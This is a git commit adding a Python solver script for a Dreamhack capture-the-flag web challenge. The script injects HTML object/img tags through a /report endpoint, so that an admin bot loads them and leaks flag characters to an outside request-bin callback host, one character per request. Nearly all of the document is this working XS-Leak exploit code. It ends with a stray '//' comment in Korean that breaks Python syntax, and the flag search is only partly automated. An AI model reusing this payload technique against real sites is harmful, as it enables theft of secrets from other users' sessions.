547bf03fe0ff9b10016a0b508151622f5e2cf965
yujinwoo <118411971+jin182@users.noreply.github.com>
2024-09-30 20:17:59 +0900

    Create search the Flag.py

---
+++ search the Flag.py
@@ -0,0 +1,33 @@
+from requests import Session
+from string import hexdigits
+from time import sleep
+
+info = lambda x: print(f"[+] {x}")
+fail = lambda x: print(f"[-] {x}")
+
+URL = "http://host3.dreamhack.games:24067/"
+REQUEST_BIN_URL = "https://aqodgee.request.dreamhack.games"
+
+sess = Session()
+sess.post(f"{URL}/signup", data={"username": "guest2", "password": "guest"})
+res = sess.post(f"{URL}/login", data={"username": "guest2", "password": "guest"})
+
+if res.status_code == 200:
+    info("Login Success")
+else:
+    fail("Login Failed...")
+
+flag = "DH{ffd48"
+lower_hexdigits = hexdigits[:-6]
+
+for hexdigit in lower_hexdigits:
+    html = f"""/search?keyword=asd</p><object data="/search?keyword={flag}{hexdigit}"><img src="{REQUEST_BIN_URL}/?callback={hexdigit}" loading="lazy"></object>"""
+    sess.post(f"{URL}/report", data={"path": html})
+    info(f"Trying: {flag}{hexdigit}")
+    sleep(0.4)
+
+info(f"Current flag: {flag}")
+info("Check the Request Bin for the next character and update the flag manually.")
+info(f"Final flag: {flag}")
+
+// 지금 테스트 중임 맞는 코드인지 확인중 
